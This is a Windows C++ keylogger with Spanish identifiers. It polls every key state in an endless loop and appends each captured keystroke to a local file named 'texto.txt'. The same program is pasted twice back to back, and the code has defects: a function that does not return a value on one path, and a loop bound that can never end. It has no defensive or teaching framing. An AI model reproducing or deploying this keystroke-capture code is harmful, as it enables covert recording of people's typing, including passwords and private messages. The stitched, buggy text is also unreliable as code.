#include <iostream>
#include <fstream>
#include <Windows.h>
#include <string>
using namespace std;
void EscribirArchivo(LPCSTR texto) {
	ofstream archivo;
	archivo.open("texto.txt", fstream::app);
	archivo << texto;
	archivo.close();
}
bool teclaspulsadas(int tecla) {
	switch (tecla)
	{
	case VK_SPACE:
		cout << " ";
		EscribirArchivo(" ");
		break;
	default: return false;
		break;
	}
}
int main() {
	unsigned char key;
	ofstream archivo;
	archivo.open("texto.txt",fstream::app);
	while (TRUE) {
		for (key = 8; key<= 255; key++)
		{
			if (GetAsyncKeyState(key)==-32767) {
				if (teclaspulsadas(key)==false) {
					cout << key;
					ofstream archivo;
					archivo.open("texto.txt", fstream::app);
					archivo << key;
					archivo.close();

				}
			}
				
		}
	}
}#include <iostream>
#include <fstream>
#include <Windows.h>
#include <string>
using namespace std;
void EscribirArchivo(LPCSTR texto) {
	ofstream archivo;
	archivo.open("texto.txt", fstream::app);
	archivo << texto;
	archivo.close();
}
bool teclaspulsadas(int tecla) {
	switch (tecla)
	{
	case VK_SPACE:
		cout << " ";
		EscribirArchivo(" ");
		break;
	default: return false;
		break;
	}
}
int main() {
	unsigned char key;
	ofstream archivo;
	archivo.open("texto.txt", fstream::app);
	while (TRUE) {
		for (key = 8; key <= 255; key++)
		{
			if (GetAsyncKeyState(key) == -32767) {
				if (teclaspulsadas(key) == false) {
					cout << key;
					ofstream archivo;
					archivo.open("texto.txt", fstream::app);
					archivo << key;
					archivo.close();

				}
			}

		}
	}
}